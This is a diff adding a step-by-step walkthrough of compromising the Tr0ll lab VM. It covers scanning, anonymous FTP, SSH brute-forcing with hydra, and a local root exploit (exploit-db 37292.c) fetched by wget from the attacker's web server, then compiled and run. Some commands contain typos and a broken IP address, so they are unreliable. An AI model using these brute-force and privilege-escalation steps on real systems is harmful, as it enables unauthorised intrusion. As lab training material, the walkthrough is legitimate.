@@ -1,0 +1,57 @@
+sudo arp-scan -l (scanning all the networks)
+nmap -sV -p- -Pn -v 192.168.157.131 (open port scan for the ip address of tr0ll.)
+ftp 192.168.157.131 (connecting to the ftp )
+username: anonymous
+password: anonymous
+ls
+download the file lol.pcap
+get lol.pcap
+analyze the data in wireshark ( using command )
+when analyzing the data . on 40th number we can find the clue.
+sup3rs3cr3tdirlol
+we open the website from the local host (ip of the kali machine)
+in the website we search for
+192.168.157.131/sup3rs3cr3tdirlol
+This takes us to the directory for the tr0ll machine.
+Here we download the file. Rofl.lmao
+Cd downloads.
+Ls
+Chmod +x roflmao
+We can open this file.
+./ roflmao (to view this file)
+We got the address 0X0856BF
+We can use this address in our website to search for clues.
+After using the address : http://192.168.157.131/0x0856BF/
+
+We find the password and username directory. We collect all the information from both the
+folders and then bruteforce using hydra.
+Nano user.txt (we can insert the fields inside the user.txt)
+Nano pass.txt (we insert the fields inside the passtxt)
+Hydra -L user.txt -P pass.txt 192.168.157.131 ssh (bruteforcing using the hydra tool)
+Once we login using the hydra tool, we can get the access for few minutes until logged out.
+Ssh overflow @192.168.157.131 to access the troll using ssh
+Bash
+Cd temp
+Uname -a (to get the troll version)
+Once we get the troll version, we can locate the version using
+Locate 37292.c
+cp /home/kali/Downloads/37292.c/usr/share/exploitdb/exploits/linux/local/37292.c
+/var/www/html/37292.c (copy the path )
+service apache2 start (starting the server to download 37292.c)
+ifconfig (checking the ip address of our system for website hosting by apache server)
+then
+again we go into
+ssh overflow 192.168.157.131
+bash
+cd tmp
+wget http://192/168.187.131/37292.c downloading the file
+ls
+gcc 37292.c
+./a.out (getting root priviliges)
+Whoami
+
+Disabling the cron
+crontab -l
+cd /opt/
+ls
+rm -r lmao.py
